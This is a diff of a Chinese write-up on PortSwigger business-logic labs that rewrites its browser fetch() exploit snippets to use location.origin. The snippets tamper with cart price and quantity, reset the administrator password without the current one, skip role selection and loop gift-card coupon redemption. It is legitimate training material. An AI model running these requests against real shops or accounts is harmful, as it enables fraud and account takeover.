@@ -15,18 +15,14 @@ last_update:
 加入購物車的時候沒檢查金額
 
 ```js
-fetch(
-  "https://0a9d00d00396c1b68117c54f00c40012.web-security-academy.net/cart",
-  {
-    headers: {
-      "content-type": "application/x-www-form-urlencoded",
-    },
-    body: "productId=1&redir=PRODUCT&quantity=1&price=100",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/cart`, {
+  headers: {
+    "content-type": "application/x-www-form-urlencoded",
   },
-);
+  body: "productId=1&redir=PRODUCT&quantity=1&price=100",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 ## Lab: High-level logic vulnerability
@@ -39,18 +35,14 @@ fetch(
 加入購物車的時候沒檢查數量，負數可以讓金額變成負的
 
 ```js
-fetch(
-  "https://0aba0073033e80add0cca0af00fe0071.web-security-academy.net/cart",
-  {
-    headers: {
-      "content-type": "application/x-www-form-urlencoded",
-    },
-    body: "productId=2&redir=PRODUCT&quantity=-26",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/cart`, {
+  headers: {
+    "content-type": "application/x-www-form-urlencoded",
   },
-);
+  body: "productId=2&redir=PRODUCT&quantity=-26",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 ## Lab: Low-level logic flaw
@@ -74,19 +66,15 @@ To make sure the price increases in predictable increments, we recommend configu
 
 ```js
 async function addToCart() {
-  return fetch(
-    "https://0a3c00bb0333802fd03fbe0d009000ac.web-security-academy.net/cart",
-    {
-      headers: {
-        "content-type": "application/x-www-form-urlencoded",
-      },
-      body: "productId=1&redir=PRODUCT&quantity=80",
-      method: "POST",
-      mode: "cors",
-      credentials: "include",
-      redirect: "manual",
+  return fetch(`${location.origin}/cart`, {
+    headers: {
+      "content-type": "application/x-www-form-urlencoded",
     },
-  );
+    body: "productId=1&redir=PRODUCT&quantity=80",
+    method: "POST",
+    credentials: "include",
+    redirect: "manual",
+  });
 }
 ```
 
@@ -152,18 +140,14 @@ Array(255 - "@dontwannacry.com".length)
 這題有點神奇，直接拿掉 `current-password`，竟然就不檢核了，可以直接修改 `administrator` 的密碼
 
 ```js
-fetch(
-  "https://0a9100cc040045e080709e79007d00e3.web-security-academy.net/my-account/change-password",
-  {
-    headers: {
-      "content-type": "application/x-www-form-urlencoded",
-    },
-    body: "csrf=OBWNVzxgoTDZXBYR13Z8wc3gUcXZBBK9&username=administrator&new-password-1=administrator&new-password-2=administrator",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/my-account/change-password`, {
+  headers: {
+    "content-type": "application/x-www-form-urlencoded",
   },
-);
+  body: "csrf=OBWNVzxgoTDZXBYR13Z8wc3gUcXZBBK9&username=administrator&new-password-1=administrator&new-password-2=administrator",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 ## Lab: Insufficient workflow validation
@@ -173,7 +157,7 @@ fetch(
 | Document  | https://portswigger.net/web-security/logic-flaws/examples#users-won-t-always-supply-mandatory-input        |
 | Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation |
 
-先買一個 $100 以內的商品，觀察結帳流程，這題在結帳成功後，會 303 轉到 https://0a0c008b03f8bc97802e08ae001800fe.web-security-academy.net/cart/order-confirmation?order-confirmed=true
+先買一個 $100 以內的商品，觀察結帳流程，這題在結帳成功後，會 303 轉到 `/cart/order-confirmation?order-confirmed=true`
 
 之後再把 $1337 的商品加入購物車，然後直接訪問上面的網址，就成功通關了～
 
@@ -187,19 +171,15 @@ fetch(
 這題登入後會 302 到 `/role-selector`，並且 GET 訪問該頁，會再回傳 `Set-Cookie: session=XaoJcQhdiqv6zs0QbxFM4DtZWifdops5; Secure; HttpOnly; SameSite=None`，但其實登入的時候就已經會 Set-Cookie 了，所以我們嘗試登入後不訪問 `/role-selector`
 
 ```js
-fetch(
-  "https://0abb00e503f8f3658105527d001400a9.web-security-academy.net/login",
-  {
-    headers: {
-      "content-type": "application/x-www-form-urlencoded",
-    },
-    body: "csrf=4b6K80egvr3eWHeNzSpbUFUrYcqInOkH&username=wiener&password=peter",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
-    redirect: "manual",
+fetch(`${location.origin}/login`, {
+  headers: {
+    "content-type": "application/x-www-form-urlencoded",
   },
-);
+  body: "csrf=4b6K80egvr3eWHeNzSpbUFUrYcqInOkH&username=wiener&password=peter",
+  method: "POST",
+  credentials: "include",
+  redirect: "manual",
+});
 ```
 
 成功拿到 Admin panel 權限～
@@ -241,48 +221,36 @@ $10 的 Gift Card 可以兌換 $10，但如果用 SUGNUP30 就可以打七折，
 
 ```js
 function applyCoupon() {
-  return fetch(
-    "https://0a16002504a949a3801253d100d600c3.web-security-academy.net/cart/coupon",
-    {
-      headers: {
-        "content-type": "application/x-www-form-urlencoded",
-      },
-      body: "csrf=5CSwsvtGPoukg8LShoI0MnK3Wc2xlDnX&coupon=SIGNUP30",
-      method: "POST",
-      mode: "cors",
-      credentials: "include",
-      redirect: "manual",
+  return fetch(`${location.origin}/cart/coupon`, {
+    headers: {
+      "content-type": "application/x-www-form-urlencoded",
     },
-  );
+    body: "csrf=5CSwsvtGPoukg8LShoI0MnK3Wc2xlDnX&coupon=SIGNUP30",
+    method: "POST",
+    credentials: "include",
+    redirect: "manual",
+  });
 }
 function addGiftCardsToCart(qty = 10) {
-  return fetch(
-    "https://0a16002504a949a3801253d100d600c3.web-security-academy.net/cart",
-    {
-      headers: {
-        "content-type": "application/x-www-form-urlencoded",
-      },
-      body: `productId=2&quantity=${qty}&redir=CART`,
-      method: "POST",
-      mode: "cors",
-      credentials: "include",
-      redirect: "manual",
+  return fetch(`${location.origin}/cart`, {
+    headers: {
+      "content-type": "application/x-www-form-urlencoded",
     },
-  );
+    body: `productId=2&quantity=${qty}&redir=CART`,
+    method: "POST",
+    credentials: "include",
+    redirect: "manual",
+  });
 }
 function checkoutAndGetGiftCardCodes() {
-  return fetch(
-    "https://0a16002504a949a3801253d100d600c3.web-security-academy.net/cart/checkout",
-    {
-      headers: {
-        "content-type": "application/x-www-form-urlencoded",
-      },
-      body: "csrf=5CSwsvtGPoukg8LShoI0MnK3Wc2xlDnX",
-      method: "POST",
-      mode: "cors",
-      credentials: "include",
+  return fetch(`${location.origin}/cart/checkout`, {
+    headers: {
+      "content-type": "application/x-www-form-urlencoded",
     },
-  )
+    body: "csrf=5CSwsvtGPoukg8LShoI0MnK3Wc2xlDnX",
+    method: "POST",
+    credentials: "include",
+  })
     .then((res) => res.text())
     .then((htmlText) => {
       const parser = new DOMParser();
@@ -295,19 +263,15 @@ function checkoutAndGetGiftCardCodes() {
     });
 }
 function redeem(code) {
-  return fetch(
-    "https://0a16002504a949a3801253d100d600c3.web-security-academy.net/gift-card",
-    {
-      headers: {
-        "content-type": "application/x-www-form-urlencoded",
-      },
-      body: `csrf=5CSwsvtGPoukg8LShoI0MnK3Wc2xlDnX&gift-card=${code}`,
-      method: "POST",
-      mode: "cors",
-      credentials: "include",
-      redirect: "manual",
+  return fetch(`${location.origin}/gift-card`, {
+    headers: {
+      "content-type": "application/x-www-form-urlencoded",
     },
-  );
+    body: `csrf=5CSwsvtGPoukg8LShoI0MnK3Wc2xlDnX&gift-card=${code}`,
+    method: "POST",
+    credentials: "include",
+    redirect: "manual",
+  });
 }
 async function main() {
   const qty = 99;
